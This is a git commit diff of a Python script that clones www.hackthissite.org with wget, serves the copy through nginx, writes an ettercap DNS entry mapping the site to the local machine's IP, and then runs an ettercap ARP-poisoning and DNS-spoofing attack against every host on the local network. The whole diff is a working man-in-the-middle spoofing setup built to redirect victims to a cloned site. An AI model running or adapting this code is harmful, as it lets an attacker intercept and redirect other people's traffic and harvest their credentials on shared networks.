1075c58220073886f9fc257fe7b5e8b34ee1fa03
jenchen18 <jen.chen318@gmail.com>
2021-04-26 17:07:22 -0400

    Added ettercap dns file editing

--- source.py
+++ source.py
@@ -1,4 +1,5 @@
 import os
+import socket
 
 SITE = "www.hackthissite.org"
 
@@ -17,10 +18,27 @@ def nginx_config():
 		file.writelines(text)
 	return 0
 
+def ip_addr():
+	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+	s.connect(("8.8.8.8", 80))
+	addr = s.getsockname()[0]
+	s.close
+	return addr
+
+def ettercap_dns():
+	path = "/etc/ettercap/etter.dns"
+	text = [SITE + " A " + ip_addr()]
+	with open(path, 'w') as file:
+                file.writelines(text)
+	return 0
+
 def main():
+	os.system("rm -r www.*")
 	os.system("wget --level=1 --recursive --page-requisites --no-parent --convert-links --adjust-extension --no-clobber -e robots=off " + SITE)
 	nginx_config()
 	os.system("systemctl restart nginx")
+	ettercap_dns()
+	os.system("ettercap -T -q -M arp -P dns_spoof /// ///")
 	return 0
 
 if __name__ == '__main__':
